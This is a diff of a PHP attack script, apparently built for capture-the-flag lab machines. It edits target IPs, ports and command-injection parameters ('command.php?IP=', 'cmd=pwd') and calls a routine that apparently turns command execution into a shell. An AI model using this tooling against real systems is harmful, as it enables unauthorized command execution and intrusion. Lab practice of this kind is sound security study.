@@ -254,12 +254,12 @@ Sur le serveur distant, on trouvera un script similaire a celui-ci, qui aura pou
         //$this->flag_poc = FALSE ;
         
         
-        $ip = "10.60.10.181";
+        $ip = "10.60.10.181"; // Acid OK 
         $port = 33447 ;
 
         $uri = "Challenge/Magic_Box/command.php?IP=10.60.10.1&submit=submit";
         $param = "IP";
-        $value = "10.60.10.1&submit=submit";
+        $value = "10.60.10.1";
         
         $methode_http = "POST";
         $url = "http://$ip:$port/$uri";
@@ -275,7 +275,7 @@ Sur le serveur distant, on trouvera un script similaire a celui-ci, qui aura pou
         $url_ce->ce2shell8param($OS);
         
         exit();
-        $ip = "192.168.2.120";
+        $ip = "192.168.2.120"; // 21LTR OK 
         $port = 80 ;
 
         $uri = "logs/backup_log.php?cmd=pwd";
